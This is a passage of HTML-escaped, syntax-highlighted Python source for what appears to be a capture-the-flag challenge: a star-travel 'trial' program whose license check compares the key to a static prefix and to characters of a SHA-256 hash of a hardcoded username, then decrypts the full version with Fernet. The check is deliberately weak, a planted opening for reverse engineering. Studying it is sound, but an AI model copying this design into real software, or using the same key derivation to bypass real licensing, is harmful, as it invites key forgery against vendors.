&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;menu_choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;       menu_choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;       menu_choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span&gt;       menu_choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;estimate_burn&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;SOL is detected as your nearest star.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  target_system &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;To which system do you want to travel? &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;target_system &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;star_db_trial:
&lt;&#x2F;span&gt;&lt;span&gt;      ly &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;star_db_trial[target_system]
&lt;&#x2F;span&gt;&lt;span&gt;      mana_cost_low &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;ly&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2
&lt;&#x2F;span&gt;&lt;span&gt;      mana_cost_high &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;ly&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;target_system &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; will cost between &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(mana_cost_low) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; and &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(mana_cost_high) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; stone(s) to project to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# TODO : could add option to list known stars
&lt;&#x2F;span&gt;&lt;span&gt;      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Star not found.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;locked_estimate_vector&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;You must buy the full version of this software to use this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;feature!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter_license&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    user_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Enter your license key: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    user_key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;user_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;bUsername_trial
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_key&lt;&#x2F;span&gt;&lt;span&gt;(user_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;bUsername_trial):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt_full_version&lt;&#x2F;span&gt;&lt;span&gt;(user_key)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Key is NOT VALID. Check your data entry.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;check_key&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;username_trial&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;key_full_template_trial
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(key) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(key_full_template_trial):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Check static base key part --v
&lt;&#x2F;span&gt;&lt;span&gt;        i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;key_part_static1_trial:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;c:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# TODO : test performance on toolbox container
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Check dynamic part --v
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;key[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;hashlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sha256&lt;&#x2F;span&gt;&lt;span&gt;(username_trial)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;hexdigest&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt_full_version&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;key_str&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    key_base64 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b64encode&lt;&#x2F;span&gt;&lt;span&gt;(key_str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fernet&lt;&#x2F;span&gt;&lt;span&gt;(key_base64)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
